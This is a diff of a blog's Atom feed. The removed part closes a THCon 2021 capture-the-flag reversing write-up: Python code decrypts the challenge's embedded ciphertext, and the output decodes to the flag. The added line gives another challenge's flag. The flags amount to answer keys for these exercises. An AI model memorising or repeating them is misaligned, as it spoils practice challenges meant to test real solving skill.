-    <span class="n">aad</span>   <span class="o">=</span> <span class="nf">bytes</span><span class="p">([</span><span class="mh">0x01</span><span class="p">,</span><span class="mh">0x02</span><span class="p">,</span><span class="mh">0x03</span><span class="p">,</span><span class="mh">0x04</span><span class="p">,</span><span class="mh">0x05</span><span class="p">,</span><span class="mh">0x06</span><span class="p">,</span><span class="mh">0x07</span><span class="p">,</span><span class="mh">0x08</span><span class="p">,</span><span class="mh">0x09</span><span class="p">,</span><span class="mh">0x0A</span><span class="p">,</span><span class="mh">0x0B</span><span class="p">,</span><span class="mh">0x0C</span><span class="p">,</span><span class="mh">0x0D</span><span class="p">,</span><span class="mh">0x0E</span><span class="p">])</span> <span class="c1">#
-</span>    <span class="n">nonce</span> <span class="o">=</span> <span class="sa">b</span><span class="sh">"</span><span class="s">your_m1ssi0n</span><span class="sh">"</span>
-
-    <span class="n">cipher_data</span>  <span class="o">=</span> <span class="n">base64</span><span class="p">.</span><span class="nf">b64decode</span><span class="p">(</span><span class="sa">b</span><span class="sh">"</span><span class="s">IkUegPuai+gfBce7nTfCkMZzZSwne3X3mnyrc5oBcD2yGHUXyMMcjCaXX2AAY20H</span><span class="sh">"</span><span class="p">)</span>
-    <span class="n">mac</span> <span class="o">=</span> <span class="nf">bytes</span><span class="p">([</span><span class="mh">0xb3</span><span class="p">,</span> <span class="mh">0x5e</span><span class="p">,</span> <span class="mh">0x5b</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0xe4</span><span class="p">,</span> <span class="mh">0x11</span><span class="p">,</span> <span class="mh">0x54</span><span class="p">,</span> <span class="mh">0x39</span><span class="p">,</span> <span class="mh">0xa3</span><span class="p">,</span> <span class="mh">0xf8</span><span class="p">,</span> <span class="mh">0xf9</span><span class="p">,</span> <span class="mh">0xfb</span><span class="p">,</span> <span class="mh">0xa3</span><span class="p">,</span> <span class="mh">0x75</span><span class="p">,</span> <span class="mh">0xd5</span><span class="p">,</span> <span class="mh">0xe8</span><span class="p">])</span> 
-  
-    <span class="nf">print_hex_bytes</span><span class="p">(</span><span class="sh">'</span><span class="s">key</span><span class="sh">'</span><span class="p">,</span> <span class="n">key</span><span class="p">)</span>
-    <span class="nf">print_hex_bytes</span><span class="p">(</span><span class="sh">'</span><span class="s">aad</span><span class="sh">'</span><span class="p">,</span> <span class="n">aad</span><span class="p">)</span>
-    <span class="nf">print_hex_bytes</span><span class="p">(</span><span class="sh">'</span><span class="s">nonce</span><span class="sh">'</span><span class="p">,</span> <span class="n">nonce</span><span class="p">)</span>
-    <span class="nf">print_hex_bytes</span><span class="p">(</span><span class="sh">'</span><span class="s">cipher data</span><span class="sh">'</span><span class="p">,</span> <span class="n">cipher_data</span><span class="p">)</span>
-    <span class="nf">print_hex_bytes</span><span class="p">(</span><span class="sh">'</span><span class="s">mac</span><span class="sh">'</span><span class="p">,</span> <span class="n">mac</span><span class="p">)</span>
-
-    <span class="n">result</span> <span class="o">=</span> <span class="nf">dec</span><span class="p">(</span><span class="n">key</span><span class="p">,</span> <span class="n">aad</span><span class="p">,</span> <span class="n">nonce</span><span class="p">,</span> <span class="n">cipher_data</span><span class="p">,</span> <span class="n">mac</span><span class="p">)</span>
-    <span class="k">if</span> <span class="n">result</span> <span class="ow">is</span> <span class="ow">not</span> <span class="bp">None</span><span class="p">:</span>
-        <span class="nf">print</span><span class="p">(</span><span class="sh">'</span><span class="se">\n</span><span class="s">Decrypted value:</span><span class="sh">'</span><span class="p">)</span>
-        <span class="nf">print_hex_bytes</span><span class="p">(</span><span class="sh">'</span><span class="se">\t</span><span class="s">result(plain data)</span><span class="sh">'</span><span class="p">,</span> <span class="n">result</span><span class="p">)</span>
-</code></pre></div></div>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/mnt/d/CTF_List/2021/thcctf/rev/mission_impossible master<span class="k">*</span> ⇣ ❯ python3 ex.py
-key len[16]: 64305f796f755f6163633370745f6974
-aad len[14]: 0102030405060708090a0b0c0d0e
-nonce len[12]: 796f75725f6d31737369306e
-cipher data len[48]: 22451e80fb9a8be81f05c7bb9d37c290c673652c277b75f79a7cab739a01703db2187517c8c31c8c26975f6000636d07
-mac len[16]: b35e5b00e4115439a3f8f9fba375d5e8
-
-enter dec <span class="k">function</span> <span class="nt">---------------------------------</span>
-plain_data len[48]: 5448436f6e32317b546831732d5761732d506f737331626c652d466f722d557d8c0cda62bc921356ee356da0fe457d63
-<span class="nb">exit </span>dec <span class="k">function</span> <span class="nt">---------------------------------</span>
-
-Decrypted value:
-        result<span class="o">(</span>plain data<span class="o">)</span> len[48]: 5448436f6e32317b546831732d5761732d506f737331626c652d466f722d557d8c0cda62bc921356ee356da0fe457d63
-
-/mnt/d/CTF_List/2021/thcctf/rev/mission_impossible master<span class="k">*</span> ⇣ ❯ python3
-Python 3.8.5 <span class="o">(</span>default, Jul 28 2020, 12:59:40<span class="o">)</span> 
-<span class="o">[</span>GCC 9.3.0] on linux
-Type <span class="s2">"help"</span>, <span class="s2">"copyright"</span>, <span class="s2">"credits"</span> or <span class="s2">"license"</span> <span class="k">for </span>more information.  
-<span class="o">&gt;&gt;&gt;</span> bytes.fromhex<span class="o">(</span><span class="s2">"5448436f6e32317b546831732d5761732d506f737331626c652d466f722d557d8c0cda62bc921356ee356da0fe457d63"</span><span class="o">)</span>
-b<span class="s1">'THCon21{Th1s-Was-Poss1ble-For-U}\x8c\x0c\xdab\xbc\x92\x13V\xee5m\xa0\xfeE}c'</span>
-</code></pre></div></div>]]></content><author><name>st4rlight</name><email>bww9643@gmail.com</email></author><category term="research" /><category term="research" /><category term="ctf" /><category term="writeup" /><summary type="html"><![CDATA[CTF writeup covering challenge analysis, exploit/reversing flow, and key takeaways.]]></summary></entry></feed>
+<p>The flag is <code class="language-plaintext highlighter-rouge">flag{44r0n_s4ys_s08r137y_1s_c00l}</code></p>]]></content><author><name>st4rlight</name><email>bww9643@gmail.com</email></author><category term="research" /><category term="research" /><category term="ctf" /><category term="writeup" /><category term="web" /><category term="reversing" /><category term="algorithm" /><summary type="html"><![CDATA[CTF writeup covering challenge analysis, exploit/reversing flow, and key takeaways.]]></summary></entry></feed>
